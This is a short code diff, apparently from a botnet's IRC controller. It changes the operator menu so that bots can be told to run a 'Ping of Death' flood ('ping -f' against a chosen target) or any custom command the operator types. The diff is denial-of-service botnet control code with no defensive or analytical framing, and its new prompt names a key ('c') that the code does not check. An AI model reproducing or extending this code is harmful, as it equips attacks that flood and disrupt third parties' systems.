@@ -1,10 +1,10 @@
 import socket
 
 def get_action(bot):
-    action = input("[IRC] Send a simple curl request ('c'), send a custom curl request ('e'), kill the bot ('kill') or exit irc connection('exit'). . . ") 
-    if action == 'c':
+    action = input("[IRC] Perform Ping of Death by bot ('f'), send a custom http request ('c'), kill the bot ('kill') or exit irc connection('exit'). . . ") 
+    if action == 'f':
         target = input("[IRC] Type the target. . . ")
-        return f"curl {target}"
+        return f"ping -f {target}"
     elif action == 'e':
         return input(f"[IRC] Type the request that you want {bot} to perform. . . ")
     elif action == 'exit' or action == 'kill':
